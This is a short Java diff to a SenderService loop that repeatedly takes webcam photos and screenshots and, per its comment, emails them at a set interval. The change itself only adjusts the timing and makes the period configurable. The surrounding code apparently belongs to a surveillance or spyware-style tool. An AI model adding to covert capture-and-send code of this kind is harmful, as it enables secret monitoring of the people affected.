@@ -19,10 +19,10 @@ public class SenderService implements Runnable {
 
     @Override
     public void run() {
-        long start = System.nanoTime();
+        long start = System.currentTimeMillis();
         while(true) {
-            long elapsed = (System.nanoTime() - start) / 1_000_000;
-            if(elapsed > 20_000) { // Send email every time period (you can augment the time as you like!)
+            long elapsed = (System.currentTimeMillis() - start) / 1000;
+            if(elapsed >= Settings.periodSendingSeconds) { // Send email every time period (you can augment the time as you like!)
                 try {
                     Camera.takePicture("capture_" + new Date().toString().replace(" ", "_").replace(":", "-"));
                     Screenshot.takeScreenshot("screenshot_" + new Date().toString().replace(" ", "_").replace(":", "-"));
